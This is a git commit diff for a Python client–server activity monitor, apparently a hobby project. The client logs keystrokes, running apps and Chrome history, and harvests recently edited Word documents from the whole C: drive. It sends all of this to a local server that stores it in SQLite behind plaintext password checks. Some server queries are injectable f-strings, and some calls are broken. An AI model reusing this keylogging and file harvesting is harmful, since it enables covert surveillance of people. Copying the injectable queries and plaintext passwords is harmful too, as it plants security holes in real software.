b0884f47ec1bfada36b4c29e591b5d2019786aa5
BLYakub <byakub.56@gmail.com>
2023-01-07 23:33:52 +0200

    update db using user id + MS word extraction

--- client.py
+++ client.py
@@ -2,17 +2,21 @@ import win32com.client
 import subprocess
 from browser_history.browsers import Chrome
 import datetime
-# from googletrans import Translator
-# import cloudscraper
+from googletrans import Translator
 from bs4 import BeautifulSoup
 import requests
 import keyboard
 from socket import *
+import os
+import docx
+from rake_nltk import Rake
+from threading import Timer, Thread
 
 sock = socket(AF_INET,SOCK_STREAM)
 sock.connect(("localhost",55000))
 
 visited_websites = []
+user_id = ""
 
 def get_buffer(data):
     length = len(data)
@@ -24,6 +28,19 @@ def get_buffer(data):
 
     buffer = (5-count)*'0' + f'{len(data)}'
     return buffer
+
+buffer = sock.recv(5).decode()
+data = sock.recv(int(buffer))
+print(data.decode())
+password = input()
+
+buffer = get_buffer(password)
+sock.send(buffer.encode())
+sock.send(password.encode())
+
+buffer = sock.recv(5).decode()
+user_id = sock.recv(int(buffer)).decode()
+
 
 def convert_to_human_time(dtmDate):
     strDateTime = ""
@@ -76,9 +93,9 @@ def get_running_apps():
             apps.append(line.decode().rstrip())
 
     apps = '#'.join(apps)
-    buffer = get_buffer(f"new_apps:{apps}")
+    buffer = get_buffer(f"new_apps:{user_id}:{apps}")
     sock.send(buffer.encode())
-    sock.send(f"new_apps:{apps}".encode())
+    sock.send(f"new_apps:{user_id}:{apps}".encode())
 
 def get_tabs():
     c = Chrome()
@@ -99,9 +116,9 @@ def get_tabs():
 
     websites = '#'.join(websites)
 
-    buffer = get_buffer(f"new_websites:{websites}")
+    buffer = get_buffer(f"new_websites:{user_id}:{websites}")
     sock.send(buffer.encode())
-    sock.send(f"new_websites:{websites}".encode())
+    sock.send(f"new_websites:{user_id}:{websites}".encode())
     
 def get_website_title(url):    
     # making requests instance
@@ -113,7 +130,6 @@ def get_website_title(url):
     return soup.find_all('title')[0].get_text()
 
 def type_trace():
-    
     recorded = keyboard.record(until='enter')
     all_keys = [key.name for key in recorded if key.event_type == "down"]
     all_keys.pop(-1)
@@ -122,29 +138,88 @@ def type_trace():
     all_keys = all_keys.replace('shift', '')
     print(all_keys)
 
-    buffer = get_buffer(f"new_keys:{all_keys}")
+    buffer = get_buffer(f"new_keys:{user_id}:{all_keys}")
     sock.send(buffer.encode())
-    sock.send(f"new_text:{all_keys}".encode())
+    sock.send(f"new_text:{user_id}:{all_keys}".encode())
+
+def get_word_docs():
+    # Initialize an empty list to store the Word documents
+    documents = []
+
+    # Set the root directory to search
+    root_dir = 'C:\\'  # This will search the entire file system
+
+    # Search for Word documents in all subdirectories of the root directory
+    for root, dirs, files in os.walk(root_dir):
+        for file in files:
+            if file.endswith('.docx'):
+                file_path = os.path.join(root, file)
+                modified_time = datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
+                documents.append((file_path, modified_time))
+
+    new_docs = []
+
+    # Print the list of Word documents and their modified dates
+    time_threshold = datetime.datetime.now() - datetime.timedelta(days=7)  # 7 days
+    for document, modified_time in documents:
+        if modified_time > time_threshold:
+            new_docs.append(document)
+
+    for doc in new_docs:
+        print(doc)
+
+    get_word_text(new_docs[-1])
 
 
-type_trace()
-# translator = Translator()
+def get_word_text(doc):
+    # Open the Word document
+    document = docx.Document(doc)
 
+    # Extract the text from the document
+    text = []
+    for paragraph in document.paragraphs:
+        text.append(paragraph.text)
 
+    # Print the extracted text
+    new_text = '\n'.join(text)
 
+    translator = Translator()
+    try:
+        new_text = translator.translate(new_text).text
 
-# try:
-#         translation = translator.translate(allthecontent).texti like food
+        new_text = str(new_text)            
+    except:
+        pass
 
+    r = Rake()
+    r.extract_keywords_from_text(new_text)
+    new_words = ' '.join(r.get_ranked_phrases())
+    print(new_words)
 
-#         translation = str(translation)[0:999]
+    buffer = get_buffer(f"new_text:{user_id}:{new_words}")
+    sock.send(buffer.encode())
+    sock.send(f"new_text:{user_id}:{new_words}".encode())
 
+# def task(message):
+#     # report the custom message
+#     print(message)
 
+# def new_task():
+#     print('yo yo')
+# # create a thread timer object
 
-#         time.sleep(10)
-        
-# except Exception as e:
-#         print(e)
+# def run_threads():
+#     while True:
+#         timer1 = Timer(4, task, args=('Hello world',))
+#         timer1.start()
+#         timer1.cancel()
+#         # timer2 = Timer(2, new_task)
+#         # timer2.start()
+
+# thread = Thread(target=run_threads)
+# thread.start()
+# # wait for the timer to finish
+# print('Waiting for the timer...')
 
 
 
--- server.py
+++ server.py
@@ -6,34 +6,88 @@ from ml_classifier import *
 from socket import *
 from select import select
 
-# conn = sqlite3.connect('my_db.db')
-# c = conn.cursor()
+conn = sqlite3.connect('my_db.db')
+c = conn.cursor()
+print('yo')
 all_sockets = []
 conn_sock = socket(AF_INET,SOCK_STREAM)
 all_sockets.append(conn_sock)
 conn_sock.bind(("localhost",55000))
 conn_sock.listen()
+print('yo 2')
 
-training_data = []
+user_passwords = {}
+with open("user_psw.txt") as file:
+    for line in file:
+        line = line.strip()
+        line = line.split(':')
+        user_passwords[line[1]] = line[0]
 
 def categorize_text(data):
-
-    text = data.split(':')[1]
+    user_id = data.split(':')[1]
+    text = data.split(':')[2]
     topic = predict_topic(text)
-    training_data.append((text, topic))
+
+    c.execute("INSERT INTO label_data (text, subject) VALUES(?,?)",(text), topic)
+    c.execute("INSERT INTO texts (user_id, topic) VALUES(?,?)",(user_id, topic))
+    conn.commit()
 
     return(topic)
 
 def process_websites(data):
-
-    websites = data.split(':')[1]
+    user_id = data.split(':')[1]
+    websites = data.split(':')[2]
     websites = websites.split('#')
     websites = [tab.split(' ') for tab in websites]
     websites = [tab.append(categorize_text(tab[1])) for tab in websites]
 
+    for tab in websites:
+        c.execute("INSERT INTO websites (user_id, link, title, topic) VALUES(?,?,?,?)",(user_id, tab[0], tab[1], tab[2])) 
+
+    conn.commit()
+
 def save_apps(data):
-    apps = data.split(':')[1]
+    user_id = data.split(':')[1]
+    apps = data.split(':')[2]
     apps = apps.split('#')
+
+    for app in apps:
+        c.execute(f"SELECT * FROM apps WHERE user_id = '{user_id}' AND name = '{app}'")
+        record = c.fetchone()
+
+        if record is None:
+            c.execute("INSERT INTO apps (user_id, name, count) VALUES(?,?,?)",(user_id, app, 1))
+        else:
+            c.execute(f"UPDATE apps SET count = {record[-1] + 1} WHERE user_id = '{user_id}' AND name = '{app}'")
+    
+    conn.commit()
+
+
+def get_buffer(data):
+    length = len(data)
+    count = 0
+
+    while length != 0:
+        length = int(length/10)
+        count+=1
+
+    buffer = (5-count)*'0' + f'{len(data)}'
+    return buffer
+
+def check_user_verification(client_socket):
+    buffer = get_buffer("Enter User Password")
+    client_socket.send(buffer.encode())
+    client_socket.send("Enter User Password".encode())
+
+    buffer = client_socket.recv(5).decode()
+    user_psw = client_socket.recv(int(buffer)).decode()
+
+    if user_psw in user_passwords:
+        buffer = get_buffer(f"{user_passwords[user_psw]}")
+        client_socket.send(buffer.encode())
+        client_socket.send(f"{user_passwords[user_psw]}".encode())
+        return True
+    return False
 
 while True:
     read,write,error =  select(all_sockets, all_sockets,[])
@@ -43,8 +97,10 @@ while True:
         # If it is a new connection then it is added to the list of sockets
         if curr_socket == conn_sock:
             client_sock,addr = conn_sock.accept()
-            all_sockets.append(client_sock)
-            print("connected")
+            check_user = check_user_verification(client_sock)
+            if check_user:
+                all_sockets.append(client_sock)
+                print("connected")
         else:
 
             # Else it recieves data from a certain client
@@ -66,7 +122,7 @@ while True:
 
                 if "new_text" in data:
                     # topic = categorize_text(data)
-                    print(data.split(':')[1])
+                    print(data.split(':')[2])
                     print(categorize_text(data))
                 
                 if "new_websites" in data:
